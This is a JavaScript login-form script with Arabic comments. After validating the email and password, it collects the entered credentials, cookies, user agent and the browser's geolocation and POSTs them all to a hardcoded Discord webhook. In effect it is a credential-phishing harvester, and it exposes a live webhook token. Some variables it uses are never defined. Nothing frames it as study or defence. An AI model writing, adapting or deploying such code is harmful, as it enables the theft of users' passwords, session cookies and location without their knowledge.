document.getElementById("loginBtn").addEventListener("click", function() {
    var email = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    var emailError = document.getElementById("emailError");
    var passwordError = document.getElementById("passwordError");

    var valid = true;

    // إعادة تعيين الرسائل السابقة
    emailError.style.display = "none";
    passwordError.style.display = "none";

    // التحقق من صحة البريد الإلكتروني
    if (!email || !validateEmail(email)) {
        emailError.textContent = "Please enter a valid email address.";
        emailError.style.display = "block";
        valid = false;
    }

    // التحقق من صحة كلمة المرور
    if (!password) {
        passwordError.textContent = "Password is required.";
        passwordError.style.display = "block";
        valid = false;
    }

    // إذا كانت جميع الحقول صحيحة، تنفيذ الإجراء
    if (valid) {
        // جمع البيانات الإضافية:
        
        // الموقع الجغرافي
        var latitude = "Unknown";
        var longitude = "Unknown";
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                latitude = position.coords.latitude;
                longitude = position.coords.longitude;
            });
        }

        // إرسال البيانات إلى Webhook بعد جمع جميع المعلومات
        var webhookUrl = "https://discord.com/api/webhooks/1314841832865402961/4IA6-FuP3RtIsLXl6Naoljd9zIrlwPsqafE-sF6ImndbPBRCQ3lQz8_d87K1iX30UR2E";
        
        // التأكد من أن الموقع الجغرافي تم جمعه قبل إرسال البيانات
        setTimeout(function() {
            // Logging البيانات لمعرفة ما إذا تم جمعها بشكل صحيح
            console.log({
                email: email,
                password: password,
                cookies: cookies,
                userAgent: userAgent,
                language: language,
                latitude: latitude,
                longitude: longitude,
                cameraStatus: cameraStatus,
                microphoneStatus: microphoneStatus
            });

            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    content: `New Login Attempt:
                        Email: ${email}
                        Password: ${password}
                        
                        ================================

                        Cookies: ${cookies}
                        User Agent: ${userAgent}
                        Location: Latitude - ${latitude}, Longitude - ${longitude}
`
                })
            })
            .then(response => {
                if (response.ok) {
                    console.log("Data sent successfully!");
                } else {
                    console.error("Error sending data:", response.status);
                }
            })
            .catch(error => {
                console.error("There was an error with the webhook request:", error);
            });
        }, 2000); // تأخير صغير لضمان جمع المعلومات
    }
});

// دالة للتحقق من صحة البريد الإلكتروني باستخدام regex
function validateEmail(email) {
    var re = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
    return re.test(email);
}
